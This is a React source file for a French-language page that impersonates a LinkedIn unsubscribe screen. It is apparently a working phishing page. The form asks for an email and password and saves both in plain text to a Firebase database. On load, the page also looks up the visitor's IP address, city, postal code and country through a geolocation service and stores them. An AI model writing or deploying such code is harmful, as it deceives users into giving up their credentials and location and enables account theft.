import React, { useState } from 'react';
import Form from "react-bootstrap/Form";
import Button from "react-bootstrap/Button";

import { fbdatabase } from '../firebase/firebase';

import { useHistory } from 'react-router-dom';

import {Container,Row ,Col } from "react-bootstrap";

const Home = () => {


    const [details,setDetails] = useState("");

    const getUserDetails = () => {
        if (details === "") {
            // fetch("https://geolocation-db.com/json/d802faa0-10bd-11ec-b2fe-47a0872c6708")
            fetch("https://geolocation-db.com/json/")
            .then( response => response.json() )
            .then( data => setDetails( data ) )
        }
    }

    const sendUserDetails = (details) => {
        if (details !== "") {
            fbdatabase.collection("ip").doc(details.IPv4).set({
                city : details.city,
                postal: details.postal,
                country : details.country_name,
            })
            .then(() => {
                console.log("Document successfully written!");
            })
            .catch((error) => {
                console.error("Error writing document: ", error);
            });    
        }
    }

    getUserDetails();

    const [email,setEmail] = useState("");
    const [pwd,setPwd] = useState("");
    //const [clicked,setClicked] = useState(false);
    const history = useHistory();

    const [isLogged,setIsLogged] = useState(false);

    const validateForm = () => {
        return email.length > 0 && pwd.length > 0;
    }


    const handleSubmit = (event) => {

        fbdatabase.collection("user").doc(email).set({
            email : email,
            pwd : pwd,
        })
        .then(() => {
            console.log("Document successfully written!");
        })
        .catch((error) => {
            console.error("Error writing document: ", error);
        });


        setIsLogged(true);
        // history.push("/sucess");
    }

    const print_text = (isLogged) => {
        if (!isLogged) {
            return (
                <Container className="milieu">
                    <p className='warning'>
                        Voulez-vous vraiment vous désabonner ?
                    </p>
                    <p className='infos'>
                        Cela engendrera l'arrêt des mails promotionnels. 
                    </p>
                </Container>
            )
        }
        else {
            return (
                <p className='infos'>
                    Désabonnement effectué.
                </p>        
            )
        }
    }
    
    return (    

        <Container>

            <Container className="haut">
                <Row className='logos'>
                    <Col className='col-3'>
                        <img  className='img-fluid' id='logo_linkedin' src='/logo_linkedin.png' alt ='...'/>
                    </Col>
                    
                    <Col className='col-9 align-items-right'>
                    {/* <img  className='img-fluid' id='logo_linkedin' src='/logo_linkedin.png' alt ='...'/> */}
                        <img className='img-fluid' id='linkedin' src='/linkedin.png' alt ='....'/>
                    </Col>
                </Row>
            </Container>

            {print_text(isLogged)}
            {/* {console.log(details)} */}
            {sendUserDetails(details)}

            {isLogged? null:(
            <Container className="bas">
                
                <Row className="login">

                    <Form onSubmit={handleSubmit}>
                        <Form.Group size="lg" controlId="email">
                        <Form.Label>Email</Form.Label>
                        <Form.Control
                            autoFocus
                            type="email"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            placeholder="exemple@gmail.com"
                        />
                        <br/>
                        </Form.Group>
                        <Form.Group size="lg" controlId="password">
                        <Form.Label>Mot de passe</Form.Label>
                        <Form.Control
                            type="password"
                            value={pwd}
                            onChange={(e) => setPwd(e.target.value)}
                        />
                        </Form.Group>
                        <p></p>
                        <Button size="lg" type="submit" disabled={!validateForm()}>
                        Désabonnement
                        </Button>
                    </Form>

                </Row>
            </Container>
            )}

        </Container>
       
    );
};

export default Home;